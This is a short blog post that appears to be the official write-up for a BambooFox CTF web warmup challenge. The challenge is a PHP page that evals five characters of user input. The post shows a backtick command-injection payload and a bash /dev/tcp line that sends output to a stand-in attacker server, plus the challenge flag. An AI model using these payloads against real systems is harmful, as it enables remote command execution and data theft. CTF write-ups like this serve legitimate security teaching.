---
layout: post
title: BambooFox CTF 2019-2020 Official Writeup for [Web] Warmup
date: 2020-01-03 13:52 +0800
tags:
  - CTF
---

*Web, 25 solves, 294 points.*

> This challenge is to increase your confidence.
>
> http://34.82.101.212:8003/ (down)  
> http://ctf.bamboofox.cs.nctu.edu.tw:8003/
>
> author: djosix

The source code:

```php
<?php

    highlight_file(__FILE__);

    if ($x = @$_GET['x'])
        eval(substr($x, 0, 5));

```

Actually you can use PHP [execution operator](https://www.php.net/manual/en/language.operators.execution.php) to execute arbitrary command like this:

```
?x=`$x`;sleep 1
```

So, you just open a TCP listener on your server:

```shell
nc -lv 9999
```

And send this query string:

```
?x=`$x`;bash -c 'ls > /dev/tcp/your-server.com/9999'
```

Then you could recieve the flag from TCP server.

```
BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
index.php
```
